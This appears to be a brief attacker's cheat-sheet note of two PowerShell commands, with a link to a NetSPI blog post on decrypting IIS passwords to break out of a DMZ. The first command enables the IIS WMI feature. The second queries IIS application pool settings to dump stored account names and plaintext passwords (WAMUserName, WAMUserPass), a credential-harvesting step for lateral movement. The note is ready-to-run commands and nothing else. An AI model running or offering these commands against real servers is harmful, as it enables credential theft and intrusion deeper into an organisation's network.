Add-WindowsFeature Web-WMI | Format-List

Get-CimInstance -Namespace root/MicrosoftIISv2 -ClassName IIsApplicationPoolSetting -Property Name, WAMUserName, WAMUserPass | select Name, WAMUserName, WAMUserPass



CMD: https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/